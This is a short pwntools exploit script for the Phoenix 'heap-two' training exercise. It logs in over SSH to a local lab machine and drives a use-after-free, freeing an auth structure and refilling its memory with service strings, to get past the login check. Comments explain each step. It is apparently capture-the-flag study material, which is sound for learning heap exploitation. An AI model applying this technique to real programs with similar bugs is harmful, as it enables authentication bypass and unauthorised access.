#!/usr/bin/python
from pwn import *
s = ssh(user='user', host='localhost', password='user', port=2222)
# the programmer allows the user to free memory as many times as they want
# and the freed pointer isn't set to NULL
# the program checks for non-zero and since the pointer for auth isn't
# 0 the user is authenticated

# first we allocate an auth struct pointer
exploit = "echo -e 'auth admin\n"
# then we free the auth struct ptr
exploit += "reset\n"
# then we allocate service (which is in the same memory address
# that auth still points to)
exploit += "service you\n"
# we do this twice so auth->auth increases above 0
exploit += "service are\n"
exploit += "service hacked\n"
# then we can login since auth->auth && auth are both non-zero
exploit += "login\n' | /opt/phoenix/i486/heap-two"
print(s[exploit])
s.close()
